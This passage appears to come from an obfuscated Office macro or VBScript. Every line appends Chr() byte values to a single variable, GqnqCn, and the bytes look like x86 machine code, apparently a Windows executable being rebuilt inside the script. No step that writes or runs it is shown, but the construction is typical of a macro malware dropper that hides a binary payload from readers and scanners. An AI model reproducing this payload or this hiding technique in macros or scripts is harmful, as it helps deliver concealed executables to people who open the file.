GqnqCn=GqnqCn&Chr(0)&Chr(119)&Chr(19)&Chr(232)&Chr(64)&Chr(22)&Chr(0)&Chr(0)&Chr(139)&Chr(196)&Chr(59)&Chr(195)&Chr(116)&Chr(28)&Chr(199)&Chr(0)&Chr(204)&Chr(204)&Chr(0)&Chr(0)&Chr(235)&Chr(17)&Chr(80)&Chr(232)&Chr(39)&Chr(5)&Chr(0)&Chr(0)&Chr(89)&Chr(59)&Chr(195)&Chr(116)&Chr(9)&Chr(199)&Chr(0)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(131)&Chr(192)&Chr(8)&Chr(137)&Chr(69)&Chr(244)&Chr(235)&Chr(3)&Chr(137)&Chr(93)&Chr(244)&Chr(57)&Chr(93)&Chr(244)&Chr(15)&Chr(132)&Chr(62)&Chr(1)&Chr(0)&Chr(0)&Chr(87)&Chr(255)&Chr(117)&Chr(244)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(16)&Chr(106)&Chr(1)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(227)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(216)&Chr(128)&Chr(64)&Chr(0)&Chr(83)&Chr(83)&Chr(87)&Chr(255)&Chr(117)&Chr(244)&Chr(255)&Chr(117)&Chr(12)&Chr(255)
GqnqCn=GqnqCn&Chr(117)&Chr(8)&Chr(255)&Chr(214)&Chr(139)&Chr(200)&Chr(137)&Chr(77)&Chr(248)&Chr(59)&Chr(203)&Chr(15)&Chr(132)&Chr(194)&Chr(0)&Chr(0)&Chr(0)&Chr(247)&Chr(69)&Chr(12)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(116)&Chr(41)&Chr(57)&Chr(93)&Chr(28)&Chr(15)&Chr(132)&Chr(176)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(77)&Chr(28)&Chr(15)&Chr(143)&Chr(167)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(117)&Chr(24)&Chr(87)&Chr(255)&Chr(117)&Chr(244)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(214)&Chr(233)&Chr(144)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(203)&Chr(126)&Chr(69)&Chr(106)&Chr(224)&Chr(51)&Chr(210)&Chr(88)&Chr(247)&Chr(241)&Chr(131)&Chr(248)&Chr(2)&Chr(114)&Chr(57)&Chr(141)&Chr(68)&Chr(9)&Chr(8)&Chr(61)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(119)&Chr(22)&Chr(232)&Chr(129)&Chr(21)&Chr(0)&Chr(0)&Chr(139)
GqnqCn=GqnqCn&Chr(244)&Chr(59)&Chr(243)&Chr(116)&Chr(106)&Chr(199)&Chr(6)&Chr(204)&Chr(204)&Chr(0)&Chr(0)&Chr(131)&Chr(198)&Chr(8)&Chr(235)&Chr(26)&Chr(80)&Chr(232)&Chr(101)&Chr(4)&Chr(0)&Chr(0)&Chr(89)&Chr(59)&Chr(195)&Chr(116)&Chr(9)&Chr(199)&Chr(0)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(131)&Chr(192)&Chr(8)&Chr(139)&Chr(240)&Chr(235)&Chr(2)&Chr(51)&Chr(246)&Chr(59)&Chr(243)&Chr(116)&Chr(65)&Chr(255)&Chr(117)&Chr(248)&Chr(86)&Chr(87)&Chr(255)&Chr(117)&Chr(244)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(216)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(34)&Chr(83)&Chr(83)&Chr(57)&Chr(93)&Chr(28)&Chr(117)&Chr(4)&Chr(83)&Chr(83)&Chr(235)&Chr(6)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(117)&Chr(248)&Chr(86)&Chr(83)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(21)&Chr(52)&Chr(128)&Chr(64)
GqnqCn=GqnqCn&Chr(0)&Chr(137)&Chr(69)&Chr(248)&Chr(86)&Chr(232)&Chr(184)&Chr(253)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(117)&Chr(244)&Chr(232)&Chr(175)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(248)&Chr(89)&Chr(233)&Chr(89)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(93)&Chr(244)&Chr(137)&Chr(93)&Chr(240)&Chr(57)&Chr(93)&Chr(8)&Chr(117)&Chr(8)&Chr(139)&Chr(6)&Chr(139)&Chr(64)&Chr(20)&Chr(137)&Chr(69)&Chr(8)&Chr(57)&Chr(93)&Chr(32)&Chr(117)&Chr(8)&Chr(139)&Chr(6)&Chr(139)&Chr(64)&Chr(4)&Chr(137)&Chr(69)&Chr(32)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(4)&Chr(21)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(69)&Chr(236)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(7)&Chr(51)&Chr(192)&Chr(233)&Chr(33)&Chr(1)&Chr(0)&Chr(0)&Chr(59)&Chr(69)&Chr(32)&Chr(15)&Chr(132)&Chr(219)&Chr(0)&Chr(0)&Chr(0)&Chr(83)&Chr(83)&Chr(141)&Chr(77)&Chr(20)&Chr(81)&Chr(255)
GqnqCn=GqnqCn&Chr(117)&Chr(16)&Chr(80)&Chr(255)&Chr(117)&Chr(32)&Chr(232)&Chr(34)&Chr(21)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(24)&Chr(137)&Chr(69)&Chr(244)&Chr(59)&Chr(195)&Chr(116)&Chr(212)&Chr(139)&Chr(53)&Chr(208)&Chr(128)&Chr(64)&Chr(0)&Chr(83)&Chr(83)&Chr(255)&Chr(117)&Chr(20)&Chr(80)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(214)&Chr(137)&Chr(69)&Chr(248)&Chr(59)&Chr(195)&Chr(117)&Chr(7)&Chr(51)&Chr(246)&Chr(233)&Chr(183)&Chr(0)&Chr(0)&Chr(0)&Chr(126)&Chr(61)&Chr(131)&Chr(248)&Chr(224)&Chr(119)&Chr(56)&Chr(131)&Chr(192)&Chr(8)&Chr(61)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(119)&Chr(22)&Chr(232)&Chr(107)&Chr(20)&Chr(0)&Chr(0)&Chr(139)&Chr(252)&Chr(59)&Chr(251)&Chr(116)&Chr(221)&Chr(199)&Chr(7)&Chr(204)&Chr(204)&Chr(0)&Chr(0)&Chr(131)&Chr(199)&Chr(8)&Chr(235)&Chr(26)&Chr(80)&Chr(232)&Chr(79)&Chr(3)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(89)&Chr(59)&Chr(195)&Chr(116)&Chr(9)&Chr(199)&Chr(0)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(131)&Chr(192)&Chr(8)&Chr(139)&Chr(248)&Chr(235)&Chr(2)&Chr(51)&Chr(255)&Chr(59)&Chr(251)&Chr(116)&Chr(180)&Chr(255)&Chr(117)&Chr(248)&Chr(83)&Chr(87)&Chr(232)&Chr(178)&Chr(251)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(255)&Chr(117)&Chr(248)&Chr(87)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(244)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(214)&Chr(137)&Chr(69)&Chr(248)&Chr(59)&Chr(195)&Chr(117)&Chr(4)&Chr(51)&Chr(246)&Chr(235)&Chr(37)&Chr(255)&Chr(117)&Chr(28)&Chr(141)&Chr(69)&Chr(248)&Chr(255)&Chr(117)&Chr(24)&Chr(80)&Chr(87)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(117)&Chr(236)&Chr(232)&Chr(113)&Chr(20)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(137)&Chr(117)&Chr(240)&Chr(131)&Chr(196)&Chr(24)&Chr(247)&Chr(222)&Chr(27)&Chr(246)
GqnqCn=GqnqCn&Chr(35)&Chr(117)&Chr(248)&Chr(87)&Chr(232)&Chr(141)&Chr(252)&Chr(255)&Chr(255)&Chr(89)&Chr(235)&Chr(26)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(208)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(240)&Chr(57)&Chr(93)&Chr(244)&Chr(116)&Chr(9)&Chr(255)&Chr(117)&Chr(244)&Chr(232)&Chr(240)&Chr(229)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(69)&Chr(240)&Chr(59)&Chr(195)&Chr(116)&Chr(12)&Chr(57)&Chr(69)&Chr(24)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(221)&Chr(229)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(198)&Chr(141)&Chr(101)&Chr(224)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(77)&Chr(252)&Chr(51)&Chr(205)&Chr(232)&Chr(133)&Chr(248)&Chr(255)&Chr(255)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(255)
GqnqCn=GqnqCn&Chr(117)&Chr(8)&Chr(141)&Chr(77)&Chr(240)&Chr(232)&Chr(224)&Chr(221)&Chr(255)&Chr(255)&Chr(255)&Chr(117)&Chr(40)&Chr(141)&Chr(77)&Chr(240)&Chr(255)&Chr(117)&Chr(36)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(232)&Chr(40)&Chr(252)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(32)&Chr(128)&Chr(125)&Chr(252)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(77)&Chr(248)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(81)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(161)&Chr(192)&Chr(178)&Chr(64)&Chr(0)&Chr(83)&Chr(86)&Chr(51)&Chr(219)&Chr(87)&Chr(139)&Chr(249)&Chr(59)&Chr(195)&Chr(117)&Chr(58)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(51)&Chr(246)&Chr(70)
GqnqCn=GqnqCn&Chr(86)&Chr(104)&Chr(224)&Chr(136)&Chr(64)&Chr(0)&Chr(86)&Chr(255)&Chr(21)&Chr(224)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(137)&Chr(53)&Chr(192)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(52)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(120)&Chr(117)&Chr(10)&Chr(106)&Chr(2)&Chr(88)&Chr(163)&Chr(192)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(5)&Chr(161)&Chr(192)&Chr(178)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(2)&Chr(15)&Chr(132)&Chr(207)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(195)&Chr(15)&Chr(132)&Chr(199)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(248)&Chr(1)&Chr(15)&Chr(133)&Chr(232)&Chr(0)&Chr(0)&Chr(0)&Chr(137)&Chr(93)&Chr(248)&Chr(57)&Chr(93)&Chr(24)&Chr(117)&Chr(8)&Chr(139)&Chr(7)&Chr(139)&Chr(64)&Chr(4)&Chr(137)&Chr(69)&Chr(24)&Chr(139)&Chr(53)&Chr(212)&Chr(128)&Chr(64)&Chr(0)&Chr(51)
GqnqCn=GqnqCn&Chr(192)&Chr(57)&Chr(93)&Chr(32)&Chr(83)&Chr(83)&Chr(255)&Chr(117)&Chr(16)&Chr(15)&Chr(149)&Chr(192)&Chr(255)&Chr(117)&Chr(12)&Chr(141)&Chr(4)&Chr(197)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(214)&Chr(139)&Chr(248)&Chr(59)&Chr(251)&Chr(15)&Chr(132)&Chr(171)&Chr(0)&Chr(0)&Chr(0)&Chr(126)&Chr(60)&Chr(129)&Chr(255)&Chr(240)&Chr(255)&Chr(255)&Chr(127)&Chr(119)&Chr(52)&Chr(141)&Chr(68)&Chr(63)&Chr(8)&Chr(61)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(119)&Chr(19)&Chr(232)&Chr(132)&Chr(18)&Chr(0)&Chr(0)&Chr(139)&Chr(196)&Chr(59)&Chr(195)&Chr(116)&Chr(28)&Chr(199)&Chr(0)&Chr(204)&Chr(204)&Chr(0)&Chr(0)&Chr(235)&Chr(17)&Chr(80)&Chr(232)&Chr(107)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(59)&Chr(195)&Chr(116)&Chr(9)&Chr(199)&Chr(0)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(131)&Chr(192)&Chr(8)&Chr(139)&Chr(216)
GqnqCn=GqnqCn&Chr(133)&Chr(219)&Chr(116)&Chr(105)&Chr(141)&Chr(4)&Chr(63)&Chr(80)&Chr(106)&Chr(0)&Chr(83)&Chr(232)&Chr(208)&Chr(249)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(87)&Chr(83)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(106)&Chr(1)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(116)&Chr(17)&Chr(255)&Chr(117)&Chr(20)&Chr(80)&Chr(83)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(224)&Chr(128)&Chr(64)&Chr(0)&Chr(137)&Chr(69)&Chr(248)&Chr(83)&Chr(232)&Chr(201)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(248)&Chr(89)&Chr(235)&Chr(117)&Chr(51)&Chr(246)&Chr(57)&Chr(93)&Chr(28)&Chr(117)&Chr(8)&Chr(139)&Chr(7)&Chr(139)&Chr(64)&Chr(20)&Chr(137)&Chr(69)&Chr(28)&Chr(57)&Chr(93)&Chr(24)&Chr(117)&Chr(8)&Chr(139)&Chr(7)&Chr(139)&Chr(64)&Chr(4)&Chr(137)&Chr(69)&Chr(24)&Chr(255)&Chr(117)&Chr(28)&Chr(232)&Chr(37)
GqnqCn=GqnqCn&Chr(18)&Chr(0)&Chr(0)&Chr(89)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(4)&Chr(51)&Chr(192)&Chr(235)&Chr(71)&Chr(59)&Chr(69)&Chr(24)&Chr(116)&Chr(30)&Chr(83)&Chr(83)&Chr(141)&Chr(77)&Chr(16)&Chr(81)&Chr(255)&Chr(117)&Chr(12)&Chr(80)&Chr(255)&Chr(117)&Chr(24)&Chr(232)&Chr(77)&Chr(18)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(131)&Chr(196)&Chr(24)&Chr(59)&Chr(243)&Chr(116)&Chr(220)&Chr(137)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(21)&Chr(220)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(59)&Chr(243)&Chr(116)&Chr(7)&Chr(86)&Chr(232)&Chr(222)&Chr(227)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(199)&Chr(141)&Chr(101)&Chr(236)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(77)&Chr(252)&Chr(51)&Chr(205)&Chr(232)&Chr(134)&Chr(246)&Chr(255)&Chr(255)
GqnqCn=GqnqCn&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(255)&Chr(117)&Chr(8)&Chr(141)&Chr(77)&Chr(240)&Chr(232)&Chr(225)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(117)&Chr(36)&Chr(141)&Chr(77)&Chr(240)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(232)&Chr(22)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(28)&Chr(128)&Chr(125)&Chr(252)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(77)&Chr(248)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(201)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(232)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(16)&Chr(204)&Chr(255)&Chr(255)&Chr(131)&Chr(101)&Chr(228)&Chr(0)&Chr(139)&Chr(117)&Chr(8)&Chr(59)&Chr(53)&Chr(184)&Chr(182)&Chr(64)&Chr(0)&Chr(119)&Chr(34)&Chr(106)&Chr(4)&Chr(232)&Chr(74)&Chr(208)
GqnqCn=GqnqCn&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(86)&Chr(232)&Chr(48)&Chr(243)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(228)&Chr(232)&Chr(28)&Chr(204)&Chr(255)&Chr(255)&Chr(195)&Chr(106)&Chr(4)&Chr(232)&Chr(69)&Chr(207)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(131)&Chr(254)&Chr(224)&Chr(15)&Chr(135)&Chr(161)&Chr(0)&Chr(0)&Chr(0)&Chr(83)&Chr(87)&Chr(139)&Chr(61)&Chr(184)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(61)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(0)&Chr(117)&Chr(24)&Chr(232)&Chr(212)&Chr(188)&Chr(255)&Chr(255)&Chr(106)&Chr(30)&Chr(232)&Chr(34)&Chr(187)&Chr(255)&Chr(255)&Chr(104)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(232)
GqnqCn=GqnqCn&Chr(100)&Chr(184)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(161)&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(1)&Chr(117)&Chr(14)&Chr(133)&Chr(246)&Chr(116)&Chr(4)&Chr(139)&Chr(198)&Chr(235)&Chr(3)&Chr(51)&Chr(192)&Chr(64)&Chr(80)&Chr(235)&Chr(28)&Chr(131)&Chr(248)&Chr(3)&Chr(117)&Chr(11)&Chr(86)&Chr(232)&Chr(83)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(22)&Chr(133)&Chr(246)&Chr(117)&Chr(1)&Chr(70)&Chr(131)&Chr(198)&Chr(15)&Chr(131)&Chr(230)&Chr(240)&Chr(86)&Chr(106)&Chr(0)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(215)&Chr(139)&Chr(216)&Chr(133)&Chr(219)&Chr(117)&Chr(46)&Chr(106)&Chr(12)&Chr(94)&Chr(57)&Chr(5)&Chr(236)&Chr(181)&Chr(64)&Chr(0)&Chr(116)&Chr(21)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(206)&Chr(214)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(15)&Chr(139)&Chr(117)
GqnqCn=GqnqCn&Chr(8)&Chr(233)&Chr(123)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(75)&Chr(209)&Chr(255)&Chr(255)&Chr(137)&Chr(48)&Chr(232)&Chr(68)&Chr(209)&Chr(255)&Chr(255)&Chr(137)&Chr(48)&Chr(95)&Chr(139)&Chr(195)&Chr(91)&Chr(235)&Chr(20)&Chr(86)&Chr(232)&Chr(167)&Chr(214)&Chr(255)&Chr(255)&Chr(89)&Chr(232)&Chr(48)&Chr(209)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(94)&Chr(93)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(8)&Chr(149)&Chr(64)&Chr(0)&Chr(232)&Chr(247)&Chr(202)&Chr(255)&Chr(255)&Chr(139)&Chr(77)&Chr(8)&Chr(51)&Chr(255)&Chr(59)&Chr(207)&Chr(118)&Chr(46)&Chr(106)&Chr(224)&Chr(88)&Chr(51)&Chr(210)&Chr(247)&Chr(241)&Chr(59)&Chr(69)&Chr(12)&Chr(27)&Chr(192)&Chr(64)&Chr(117)&Chr(31)&Chr(232)&Chr(252)&Chr(208)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(87)&Chr(87)&Chr(87)&Chr(87)
GqnqCn=GqnqCn&Chr(87)&Chr(232)&Chr(132)&Chr(208)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(51)&Chr(192)&Chr(233)&Chr(213)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(175)&Chr(77)&Chr(12)&Chr(139)&Chr(241)&Chr(137)&Chr(117)&Chr(8)&Chr(59)&Chr(247)&Chr(117)&Chr(3)&Chr(51)&Chr(246)&Chr(70)&Chr(51)&Chr(219)&Chr(137)&Chr(93)&Chr(228)&Chr(131)&Chr(254)&Chr(224)&Chr(119)&Chr(105)&Chr(131)&Chr(61)&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(3)&Chr(117)&Chr(75)&Chr(131)&Chr(198)&Chr(15)&Chr(131)&Chr(230)&Chr(240)&Chr(137)&Chr(117)&Chr(12)&Chr(139)&Chr(69)&Chr(8)&Chr(59)&Chr(5)&Chr(184)&Chr(182)&Chr(64)&Chr(0)&Chr(119)&Chr(55)&Chr(106)&Chr(4)&Chr(232)&Chr(210)&Chr(206)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(125)&Chr(252)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(183)&Chr(241)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)
GqnqCn=GqnqCn&Chr(255)&Chr(232)&Chr(95)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(93)&Chr(228)&Chr(59)&Chr(223)&Chr(116)&Chr(17)&Chr(255)&Chr(117)&Chr(8)&Chr(87)&Chr(83)&Chr(232)&Chr(13)&Chr(247)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(59)&Chr(223)&Chr(117)&Chr(97)&Chr(86)&Chr(106)&Chr(8)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(184)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(216)&Chr(59)&Chr(223)&Chr(117)&Chr(76)&Chr(57)&Chr(61)&Chr(236)&Chr(181)&Chr(64)&Chr(0)&Chr(116)&Chr(51)&Chr(86)&Chr(232)&Chr(190)&Chr(213)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(15)&Chr(133)&Chr(114)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(16)&Chr(59)&Chr(199)&Chr(15)&Chr(132)&Chr(80)&Chr(255)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(233)&Chr(69)&Chr(255)&Chr(255)&Chr(255)&Chr(51)&Chr(255)&Chr(139)&Chr(117)
GqnqCn=GqnqCn&Chr(12)&Chr(106)&Chr(4)&Chr(232)&Chr(118)&Chr(205)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(59)&Chr(223)&Chr(117)&Chr(13)&Chr(139)&Chr(69)&Chr(16)&Chr(59)&Chr(199)&Chr(116)&Chr(6)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(195)&Chr(232)&Chr(43)&Chr(202)&Chr(255)&Chr(255)&Chr(195)&Chr(106)&Chr(16)&Chr(104)&Chr(40)&Chr(149)&Chr(64)&Chr(0)&Chr(232)&Chr(217)&Chr(201)&Chr(255)&Chr(255)&Chr(139)&Chr(93)&Chr(8)&Chr(133)&Chr(219)&Chr(117)&Chr(14)&Chr(255)&Chr(117)&Chr(12)&Chr(232)&Chr(253)&Chr(253)&Chr(255)&Chr(255)&Chr(89)&Chr(233)&Chr(204)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(117)&Chr(12)&Chr(133)&Chr(246)&Chr(117)&Chr(12)&Chr(83)&Chr(232)&Chr(34)&Chr(225)&Chr(255)&Chr(255)&Chr(89)&Chr(233)&Chr(183)&Chr(1)&Chr(0)&Chr(0)&Chr(131)&Chr(61)&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(3)&Chr(15)&Chr(133)&Chr(147)&Chr(1)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(51)&Chr(255)&Chr(137)&Chr(125)&Chr(228)&Chr(131)&Chr(254)&Chr(224)&Chr(15)&Chr(135)&Chr(138)&Chr(1)&Chr(0)&Chr(0)&Chr(106)&Chr(4)&Chr(232)&Chr(223)&Chr(205)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(125)&Chr(252)&Chr(83)&Chr(232)&Chr(231)&Chr(232)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(224)&Chr(59)&Chr(199)&Chr(15)&Chr(132)&Chr(158)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(53)&Chr(184)&Chr(182)&Chr(64)&Chr(0)&Chr(119)&Chr(73)&Chr(86)&Chr(83)&Chr(80)&Chr(232)&Chr(201)&Chr(237)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)&Chr(116)&Chr(5)&Chr(137)&Chr(93)&Chr(228)&Chr(235)&Chr(53)&Chr(86)&Chr(232)&Chr(152)&Chr(240)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(59)&Chr(199)&Chr(116)&Chr(39)&Chr(139)&Chr(67)&Chr(252)&Chr(72)&Chr(59)&Chr(198)&Chr(114)&Chr(2)&Chr(139)&Chr(198)&Chr(80)&Chr(83)&Chr(255)&Chr(117)&Chr(228)
GqnqCn=GqnqCn&Chr(232)&Chr(19)&Chr(226)&Chr(255)&Chr(255)&Chr(83)&Chr(232)&Chr(151)&Chr(232)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(224)&Chr(83)&Chr(80)&Chr(232)&Chr(189)&Chr(232)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(24)&Chr(57)&Chr(125)&Chr(228)&Chr(117)&Chr(72)&Chr(59)&Chr(247)&Chr(117)&Chr(6)&Chr(51)&Chr(246)&Chr(70)&Chr(137)&Chr(117)&Chr(12)&Chr(131)&Chr(198)&Chr(15)&Chr(131)&Chr(230)&Chr(240)&Chr(137)&Chr(117)&Chr(12)&Chr(86)&Chr(87)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(184)&Chr(128)&Chr(64)&Chr(0)&Chr(137)&Chr(69)&Chr(228)&Chr(59)&Chr(199)&Chr(116)&Chr(32)&Chr(139)&Chr(67)&Chr(252)&Chr(72)&Chr(59)&Chr(198)&Chr(114)&Chr(2)&Chr(139)&Chr(198)&Chr(80)&Chr(83)&Chr(255)&Chr(117)&Chr(228)&Chr(232)&Chr(191)&Chr(225)&Chr(255)&Chr(255)&Chr(83)&Chr(255)&Chr(117)&Chr(224)&Chr(232)&Chr(112)&Chr(232)&Chr(255)&Chr(255)&Chr(131)&Chr(196)
